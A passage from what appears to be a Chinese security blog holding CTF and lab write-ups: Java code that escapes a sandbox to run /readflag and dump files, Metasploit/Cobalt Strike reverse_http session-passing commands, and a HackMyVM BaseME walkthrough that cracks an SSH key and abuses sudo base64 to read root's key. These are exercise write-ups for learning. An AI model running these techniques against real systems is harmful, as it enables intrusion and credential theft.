class=\"type\">StringBuilder</span> <span class=\"variable\">segBuilder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">                                    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> segment.length(); j &gt; <span class=\"number\">0</span>; j -= <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                                        segBuilder.append(segment.substring(j - <span class=\"number\">2</span>, j));</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                    ipBuilder.insert(<span class=\"number\">0</span>, segBuilder.toString());</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (i &gt; <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">                                        ipBuilder.insert(<span class=\"number\">0</span>, <span class=\"string\">&quot;:&quot;</span>);</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                ip = ipBuilder.toString();</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                <span class=\"comment\">// IPv4 address parsing</span></span><br><span class=\"line\">                                <span class=\"type\">StringBuilder</span> <span class=\"variable\">ipBuilder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">                                <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> ipHex.length(); i &gt; <span class=\"number\">0</span>; i -= <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                                    <span class=\"type\">String</span> <span class=\"variable\">part</span> <span class=\"operator\">=</span> ipHex.substring(i - <span class=\"number\">2</span>, i);</span><br><span class=\"line\">                                    <span class=\"type\">int</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> Integer.parseInt(part, <span class=\"number\">16</span>);</span><br><span class=\"line\">                                    ipBuilder.insert(<span class=\"number\">0</span>, num);</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (i &gt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                                        ipBuilder.insert(<span class=\"number\">0</span>, <span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                ip = ipBuilder.toString();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> Integer.parseInt(portHex, <span class=\"number\">16</span>);</span><br><span class=\"line\">                            System.out.println(<span class=\"string\">&quot;Listening on &quot;</span> + ip + <span class=\"string\">&quot;:&quot;</span> + port);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                reader.close();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (java.io.IOException e) &#123;</span><br><span class=\"line\">                System.out.println(e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            java.net.<span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.net.URL(<span class=\"string\">&quot;http://127.0.0.1:46461/sandbox/default/module/http/sandbox-control/shutdown&quot;</span>);</span><br><span class=\"line\">            java.net.<span class=\"type\">HttpURLConnection</span> <span class=\"variable\">connection</span> <span class=\"operator\">=</span> (java.net.HttpURLConnection) url.openConnection();</span><br><span class=\"line\">            connection.setRequestMethod(<span class=\"string\">&quot;GET&quot;</span>);</span><br><span class=\"line\">            java.io.<span class=\"type\">BufferedReader</span> <span class=\"variable\">reader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.BufferedReader(</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.InputStreamReader(connection.getInputStream())</span><br><span class=\"line\">            );</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            <span class=\"type\">StringBuilder</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((line = reader.readLine()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                response.append(line).append(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            reader.close();</span><br><span class=\"line\">            connection.disconnect();</span><br><span class=\"line\">            System.out.println(response.toString()); System.out.println(connection.getResponseCode());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (java.io.IOException e) &#123;</span><br><span class=\"line\">            System.out.println(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">command</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;/readflag&quot;</span>; <span class=\"comment\">// Use &quot;dir&quot; on Windows</span></span><br><span class=\"line\">            java.lang.<span class=\"type\">Process</span> <span class=\"variable\">process</span> <span class=\"operator\">=</span> java.lang.Runtime.getRuntime().exec(command);</span><br><span class=\"line\">            java.io.<span class=\"type\">BufferedReader</span> <span class=\"variable\">reader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.BufferedReader(</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.InputStreamReader(process.getInputStream())</span><br><span class=\"line\">            );</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((line = reader.readLine()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                System.out.println(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            reader.close();</span><br><span class=\"line\">            process.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*try&#123;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">java.io.File folder = new java.io.File(&quot;/home&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">        if (!folder.isDirectory()) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">            System.out.println(&quot;Provided path is not a folder&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">            return;</span></span><br><span class=\"line\"><span class=\"comment\">        &#125;</span></span><br><span class=\"line\"><span class=\"comment\">        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();</span></span><br><span class=\"line\"><span class=\"comment\">        java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(baos);</span></span><br><span class=\"line\"><span class=\"comment\">        java.util.Stack&lt;java.io.File&gt; stack = new java.util.Stack&lt;java.io.File&gt;();</span></span><br><span class=\"line\"><span class=\"comment\">        stack.push(folder);</span></span><br><span class=\"line\"><span class=\"comment\">        while (!stack.isEmpty()) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">            java.io.File currentFile = stack.pop();</span></span><br><span class=\"line\"><span class=\"comment\">            if (currentFile.isDirectory()) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                java.io.File[] fileList = currentFile.listFiles();</span></span><br><span class=\"line\"><span class=\"comment\">                if (fileList != null) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                    for (int i = 0; i &lt; fileList.length; i++) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                        stack.push(fileList[i]);</span></span><br><span class=\"line\"><span class=\"comment\">                    &#125;</span></span><br><span class=\"line\"><span class=\"comment\">                &#125;</span></span><br><span class=\"line\"><span class=\"comment\">            &#125; else &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                java.io.FileInputStream fis = new java.io.FileInputStream(currentFile);</span></span><br><span class=\"line\"><span class=\"comment\">                String zipEntryName = currentFile.getAbsolutePath().substring(folder.getAbsolutePath().length() + 1);</span></span><br><span class=\"line\"><span class=\"comment\">                zos.putNextEntry(new java.util.zip.ZipEntry(zipEntryName));</span></span><br><span class=\"line\"><span class=\"comment\">                byte[] buffer = new byte[1024];</span></span><br><span class=\"line\"><span class=\"comment\">                int length;</span></span><br><span class=\"line\"><span class=\"comment\">                while ((length = fis.read(buffer)) &gt; 0) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                    zos.write(buffer, 0, length);</span></span><br><span class=\"line\"><span class=\"comment\">                &#125;</span></span><br><span class=\"line\"><span class=\"comment\">                fis.close();</span></span><br><span class=\"line\"><span class=\"comment\">                zos.closeEntry();</span></span><br><span class=\"line\"><span class=\"comment\">            &#125;</span></span><br><span class=\"line\"><span class=\"comment\">        &#125;</span></span><br><span class=\"line\"><span class=\"comment\">        zos.close();</span></span><br><span class=\"line\"><span class=\"comment\">        byte[] zipBytes = baos.toByteArray();</span></span><br><span class=\"line\"><span class=\"comment\">        StringBuilder hexString = new StringBuilder();</span></span><br><span class=\"line\"><span class=\"comment\">        for (int i = 0; i &lt; zipBytes.length; i++) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">            String hex = Integer.toHexString(0xff &amp; zipBytes[i]);</span></span><br><span class=\"line\"><span class=\"comment\">            if (hex.length() == 1) hexString.append(&#x27;0&#x27;);</span></span><br><span class=\"line\"><span class=\"comment\">            hexString.append(hex);</span></span><br><span class=\"line\"><span class=\"comment\">        &#125;</span></span><br><span class=\"line\"><span class=\"comment\">        System.out.println(hexString.toString());</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">&#125;catch(Exception e)&#123;System.out.println(e);&#125;*/</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#读取文件</span><br><span class=\"line\"></span><br><span class=\"line\">try &#123;                  </span><br><span class=\"line\">    java.io.File file = new java.io.File(&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;); // 需要读取的二进制文件     </span><br><span class=\"line\">    java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file));                  </span><br><span class=\"line\">            byte[] buffer = new byte[1024]; // 创建一个字节数组作为缓冲区                  </span><br><span class=\"line\">            int bytesRead;                       </span><br><span class=\"line\">            while ((bytesRead = bis.read(buffer)) != -1) &#123; // 循环读取                  </span><br><span class=\"line\">                // 处理读取的数据（这里可以进行打印、处理等）                  </span><br><span class=\"line\">                //System.out.write(buffer, 0, bytesRead);                  </span><br><span class=\"line\">System.out.print(&#x27;&quot;&#x27;);                  </span><br><span class=\"line\">                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));                  </span><br><span class=\"line\">System.out.println(&quot;\\&quot;,&quot;);                  </span><br><span class=\"line\">\t      &#125;                                   </span><br><span class=\"line\">        &#125; catch (                  </span><br><span class=\"line\">java.io.IOException e) &#123;                  </span><br><span class=\"line\">            e.printStackTrace();                  </span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实比赛的时候想过用base64将文件编码读取，但是因为数据过大导致网页卡死了就没有继续想过了</p>\n<hr>\n<p>唉，还得继续学，太菜了</p>\n","categories":["ctf","复盘"],"tags":["ctf"]},{"title":"记红日靶场2过程中的不足","url":"/2024/11/11/%E8%AE%B0%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%8D%E8%B6%B3/","content":"<h1 id=\"msf派生cs\"><a href=\"#msf派生cs\" class=\"headerlink\" title=\"msf派生cs\"></a>msf派生cs</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#msf</span><br><span class=\"line\">background</span><br><span class=\"line\">use exploit/windows/local/payload_inject</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set DisablePayloadHandler true</span><br><span class=\"line\">set lhost 192.168.116.131</span><br><span class=\"line\">set lport 9000</span><br><span class=\"line\">set session 2</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p>cs的监听要和lport的端口一样</p>\n<h1 id=\"cs派生msf\"><a href=\"#cs派生msf\" class=\"headerlink\" title=\"cs派生msf\"></a>cs派生msf</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#msf</span><br><span class=\"line\">background</span><br><span class=\"line\">use payload payload/windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost 192.168.116.131</span><br><span class=\"line\">set lport 9001</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p>cs新建一个foreing http监听设置和msf的设置一样，然后cs新建会话到这个监听器即可。</p>\n<hr>\n<p>其实不止这么多，包括进程迁移，票据之类的一个cs全部搞定了就，但是我还是想尝试一下怎么用纯手动打靶而且打靶环境过于理想完全没有考虑过流量特征的问题，有机会了补一篇，内网的学习路漫漫。</p>\n","categories":["内网渗透"],"tags":["内网"]},{"title":"HackmyVM-BaseME","url":"/2025/01/22/HackmyVM-BaseME/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>arp-scan -l </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.232  08:00:27:d9:d3:0c       PCS Systemtechnik GmbH</span><br><span class=\"line\"></span><br><span class=\"line\">4 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 1.973 seconds (129.75 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip为192.168.31.220，nmap扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.232 --min-rate=1000 -p-</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:13 EST</span><br><span class=\"line\">Nmap scan report for baseme (192.168.31.232)</span><br><span class=\"line\">Host is up (0.0065s latency).</span><br><span class=\"line\">Not shown: 65533 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 08:00:27:D9:D3:0C (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# curl 192.168.31.232</span><br><span class=\"line\">QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!--</span><br><span class=\"line\">iloveyou</span><br><span class=\"line\">youloveyou</span><br><span class=\"line\">shelovesyou</span><br><span class=\"line\">helovesyou</span><br><span class=\"line\">weloveyou</span><br><span class=\"line\">theyhatesme</span><br><span class=\"line\">--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>给了一串base64和几个字符串</p>\n<p>base64解码内容为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# echo &quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot;|base64 -d</span><br><span class=\"line\">ALL, absolutely ALL that you need is in BASE64.</span><br><span class=\"line\">Including the password that you need :)</span><br><span class=\"line\">Remember, BASE64 has the answer to all your questions.</span><br><span class=\"line\">-lucas</span><br></pre></td></tr></table></figure>\n\n<p>可以知道用户名为lucas，并且所有内容都要进行base64。</p>\n<p>将字典进行base64编码，然后扫描目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;done</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# gobuster dir -u &quot;http://192.168.31.232&quot; -w ./1</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://192.168.31.232</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                ./1</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/aWRfcnNhCg==         (Status: 200) [Size: 2537]</span><br><span class=\"line\">/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]</span><br><span class=\"line\">Progress: 4736 / 4737 (99.98%)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Finished</span><br><span class=\"line\">===============================================================</span><br></pre></td></tr></table></figure>\n\n<p>这两个文件分别是id_rsa和robots.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# echo &quot;aWRfcnNhCg==&quot;|base64 -d</span><br><span class=\"line\">id_rsa</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# echo &quot;cm9ib3RzLnR4dAo=&quot;|base64 -d</span><br><span class=\"line\">robots.txt</span><br></pre></td></tr></table></figure>\n\n<p>robots.txt里什么也没有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# base64 cm9ib3RzLnR4dAo= -d</span><br><span class=\"line\">Nothing here :(</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# base64 aWRfcnNhCg=\\= -d</span><br><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class=\"line\">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class=\"line\">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class=\"line\">07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh</span><br><span class=\"line\">7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv</span><br><span class=\"line\">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class=\"line\">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span><br><span class=\"line\">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK</span><br><span class=\"line\">xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs</span><br><span class=\"line\">+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi</span><br><span class=\"line\">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ</span><br><span class=\"line\">zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span><br><span class=\"line\">IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span><br><span class=\"line\">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span><br><span class=\"line\">MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span><br><span class=\"line\">+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class=\"line\">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class=\"line\">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span><br><span class=\"line\">tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span><br><span class=\"line\">N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class=\"line\">Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span><br><span class=\"line\">O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span><br><span class=\"line\">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class=\"line\">3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span><br><span class=\"line\">ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span><br><span class=\"line\">LdmmRXUS/DtO+69/aidvxGAYob+1M=</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>80端口给了几个字符串就是字典，base64编码后爆破id_rsa的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat 1|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;done</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat 1</span><br><span class=\"line\">iloveyou</span><br><span class=\"line\">youloveyou</span><br><span class=\"line\">shelovesyou</span><br><span class=\"line\">helovesyou</span><br><span class=\"line\">weloveyou</span><br><span class=\"line\">theyhatesme</span><br><span class=\"line\">aWxvdmV5b3UK</span><br><span class=\"line\">eW91bG92ZXlvdQo=</span><br><span class=\"line\">c2hlbG92ZXN5b3UK</span><br><span class=\"line\">aGVsb3Zlc3lvdQo=</span><br><span class=\"line\">d2Vsb3ZleW91Cg==</span><br><span class=\"line\">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ssh2john id_rsa&gt;1</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# john 1 -w=1</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class=\"line\">No password hashes left to crack (see FAQ)</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# john 1 -w=1 --show</span><br><span class=\"line\">Invalid options combination: &quot;--show&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# john 1  --show</span><br><span class=\"line\">id_rsa:aWxvdmV5b3UK</span><br><span class=\"line\"></span><br><span class=\"line\">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>\n\n<p>lucas用户的密码就是aWxvdmV5b3UK</p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>ssh登录拿到user.txt</p>\n<p>sudo -l可以无密码运行base64，直接读取/root/root.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/root.txt|base64 -d</span><br><span class=\"line\">sudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname</span><br><span class=\"line\">                                   .     **</span><br><span class=\"line\">                                *           *.</span><br><span class=\"line\">                                              ,*</span><br><span class=\"line\">                                                 *,</span><br><span class=\"line\">                         ,                         ,*</span><br><span class=\"line\">                      .,                              *,</span><br><span class=\"line\">                    /                                    *</span><br><span class=\"line\">                 ,*                                        *,</span><br><span class=\"line\">               /.                                            .*.</span><br><span class=\"line\">             *                                                  **</span><br><span class=\"line\">             ,*                                               ,*</span><br><span class=\"line\">                **                                          *.</span><br><span class=\"line\">                   **                                    **.</span><br><span class=\"line\">                     ,*                                **</span><br><span class=\"line\">                        *,                          ,*</span><br><span class=\"line\">                           *                      **</span><br><span class=\"line\">                             *,                .*</span><br><span class=\"line\">                                *.           **</span><br><span class=\"line\">                                  **      ,*,</span><br><span class=\"line\">                                     ** *,</span><br><span class=\"line\"></span><br><span class=\"line\">HMVFKBS64</span><br></pre></td></tr></table></figure>\n\n<p>想提权到root的话需要读取id_rsa</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/.ssh/id_rsa|base64 -d</span><br><span class=\"line\">sudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname</span><br><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class=\"line\">NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B</span><br><span class=\"line\">IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp</span><br><span class=\"line\">DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk</span><br><span class=\"line\">/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7</span><br><span class=\"line\">px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a</span><br><span class=\"line\">S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ</span><br><span class=\"line\">7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx</span><br><span 